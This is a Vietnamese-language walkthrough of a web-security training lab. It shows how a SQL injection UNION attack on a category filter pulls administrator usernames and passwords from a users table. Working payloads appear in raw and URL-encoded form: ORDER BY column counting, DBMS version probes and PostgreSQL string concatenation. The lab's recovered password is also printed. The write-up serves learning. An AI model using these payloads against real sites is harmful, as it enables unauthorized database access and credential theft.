[lab10.md](https://github.com/user-attachments/files/23074731/lab10.md)
Câu 10 SQL injection UNION attack, retrieving multiple values in a
single column

Mô tả bài lab: khai thác lỗ hổng SQL injection ở bộ lọc category để truy
vấn và hiển thị username và password của administrator từ một bảng biết
tên là users và cột username, password. Đăng nhập bằng tài khoảng
administrator là hoàn thành bài lab

Bước 1: Xác định web có lỗ hỏng SQL injection hay không  
Chọn category bất kỳ và thêm ký tự \' vào cuối URL, nếu như có thông báo
lỗi internal server error thì có tồn tại lỗ hỏng SQL injection

![A screenshot of a computer AI-generated content may be
incorrect.](image/image1.png){width="6.260416666666667in"
height="1.625in"}

Bước 2: Xác định có thể khai thác web bằng SQL injection UNION được
không

Nếu như ta chỉnh sửa URL sao cho category=any_string , nếu nhập URL đã
chỉnh sửa mà trang web hiển thị any_string thì ta xác định có thể khai
thác bằng SQL injection UNION

![A screen shot of a computer AI-generated content may be
incorrect.](image/image2.png){width="6.260416666666667in"
height="2.53125in"}

Bước 3: Xác định payload SQL injection UNION

Để có thể xác định được payload tấn công, ta cần xác định số cột của
bảng category và xác định kiểu dữ liệu của các cột tương ứng để khai
thác dữ liệu có lợi cho bên tấn công, kiểu dữ liệu mà ta quan tâm thường
là dạng chuỗi

Để có thể xác định sỗ lượng cột của bảng category ta sử dụng payload như
sau: \' order by n\-- (tăng dần n cho đến khi có thông báo lỗi internal
server error, khi có lỗi xảy ra thì số lượng cột của bảng là n-1)

Với chuỗi injection là \' order by 3-- thì xuất hiện lỗi, như vậy bảng
có 2 cột

![A screenshot of a computer AI-generated content may be
incorrect.](image/image3.png){width="6.260416666666667in"
height="1.6145833333333333in"}

Bây giờ ta đi tìm trong hai cột của bảng category xem có cột nào kiểu
string không, thực ra thì ta nhìn vào tên sản phẩm và mô tả cũng đủ biết
đó là string, nhưng mà cứ viết payload dò đi cho chắc ăn

\' union select \'a\',NULLl\-- encode \'+union+select+\'a\',NULL\--

Dùng lệnh này gặp lỗi thì cột 1 không phải là string

![A screenshot of a computer AI-generated content may be
incorrect.](image/image4.png){width="6.260416666666667in"
height="1.4166666666666667in"}

\' union select NULL,\'a\'\-- encode \'+union+select+NULL,\'a\'\--

Dòng a dưới cùng cho thấy cột 2 có kiểu string

![A screenshot of a computer AI-generated content may be
incorrect.](image/image5.png){width="6.260416666666667in"
height="3.03125in"}

Đến đây ta đã có đủ dữ kiện để tạo union payload, ta có thể lấy từng cột
một như sau

\' union select NULL,username from users 

encode 

\'+union+select+NULL,username+from+users

\' union select NULL,password from user

encode

\'+union+select+NULL,password+from+user

Hoặc ta có thể truy vấn cùng lúc cả hai cột username và password bằng
cách bằng string concatenation

Nhưng ta vẫn chưa biết đây là cơ sở dữ liệu gì để lựa chọn cú pháp, ta
có thể xác định hệ quản trị cơ sở dữ liệu mà web dùng bằng các truy vấn
sau

Oracle SELECT banner FROM v\$version

SELECT version FROM v\$instance

Microsoft SELECT @@version

PostgreSQL SELECT version()

MySQL SELECT @@version

Thử kiểm tra xem có phải là Microsoft không

\' union select NULL, @@version\-- encode
\'+union+select+NULL,@@version\--

Ta nhận được internal server error tức là đã sai cú pháp. Đây không phải
là DBMS Microsoft

![A screenshot of a computer AI-generated content may be
incorrect.](image/image6.png){width="6.270833333333333in"
height="1.34375in"}

Thử cho PostgreSQL

\' union select NULL, version()\-- encode
\'+union+select+NULL,version()\--

Dựa vào kết quả ta xác nhận web dùng PostgreSQL

![A screenshot of a computer AI-generated content may be
incorrect.](image/image7.png){width="6.270833333333333in"
height="3.1666666666666665in"}

Giờ ta đã biết cú pháp để thực hiện string concatenation

\' union select NULL,username \|\|+\'\*\'+\|\| password from users\--

encode 

\'+union+select+NULL,username+\|\|+\'\*\'+\|\|+password+from+users\--

Như vậy ta đã lấy được tên tài khoảng và mật khẩu của administrator
administratorqgbspqzgtlejfm5dnasm

Tên tài khoảng: **administrator**

Mật khẩu: **qgbspqzgtlejfm5dnasm**

![A screenshot of a computer AI-generated content may be
incorrect.](image/image8.png){width="6.260416666666667in"
height="3.1770833333333335in"}

Tiến hành đăng nhập

![A screenshot of a computer AI-generated content may be
incorrect.](image/image9.png){width="6.260416666666667in"
height="2.5520833333333335in"}
